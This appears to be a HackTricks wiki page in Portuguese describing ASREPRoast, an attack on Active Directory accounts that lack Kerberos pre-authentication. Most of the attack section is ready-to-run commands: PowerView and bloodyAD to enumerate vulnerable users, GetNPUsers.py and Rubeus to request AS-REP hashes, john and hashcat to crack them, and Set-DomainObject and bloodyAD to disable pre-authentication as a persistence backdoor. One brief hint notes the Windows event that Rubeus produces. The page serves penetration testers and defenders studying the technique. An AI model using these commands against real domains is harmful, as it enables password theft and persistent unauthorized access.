# ASREPRoast

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e caçadores de recompensas por bugs!

**Percepções de Hacking**\
Engaje-se com conteúdo que explora a emoção e os desafios do hacking

**Notícias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking através de notícias e percepções em tempo real

**Últimos Anúncios**\
Fique informado sobre os mais recentes programas de recompensas por bugs lançados e atualizações cruciais na plataforma

**Junte-se a nós no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

## ASREPRoast

ASREPRoast é um ataque de segurança que explora usuários que não possuem o **atributo necessário de pré-autenticação do Kerberos**. Essencialmente, essa vulnerabilidade permite que os atacantes solicitem autenticação para um usuário do Controlador de Domínio (DC) sem precisar da senha do usuário. O DC então responde com uma mensagem criptografada com a chave derivada da senha do usuário, que os atacantes podem tentar quebrar offline para descobrir a senha do usuário.

Os principais requisitos para esse ataque são:
- **Falta de pré-autenticação do Kerberos**: Os usuários-alvo não devem ter esse recurso de segurança ativado.
- **Conexão com o Controlador de Domínio (DC)**: Os atacantes precisam de acesso ao DC para enviar solicitações e receber mensagens criptografadas.
- **Conta de domínio opcional**: Ter uma conta de domínio permite que os atacantes identifiquem de forma mais eficiente os usuários vulneráveis por meio de consultas LDAP. Sem essa conta, os atacantes devem adivinhar os nomes de usuário.


#### Enumerando usuários vulneráveis (necessita de credenciais de domínio)

{% code title="Usando Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Usando Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
{% endcode %}

#### Solicitar mensagem AS_REP

{% code title="Usando Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Usando o Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
O AS-REP Roasting com o Rubeus irá gerar um 4768 com um tipo de criptografia de 0x17 e tipo de pré-autenticação de 0.
{% endhint %}

### Quebra
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistência

Forçar **pré-autenticação** não é necessária para um usuário onde você tem permissões de **GenericAll** (ou permissões para escrever propriedades):

{% code title="Usando Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Usando Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## Referências

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e caçadores de bugs!

**Percepções de Hacking**\
Engaje-se com conteúdo que explora a emoção e os desafios do hacking

**Notícias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking através de notícias e insights em tempo real

**Últimos Anúncios**\
Fique informado sobre os mais novos programas de recompensas por bugs lançados e atualizações cruciais na plataforma

**Junte-se a nós no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
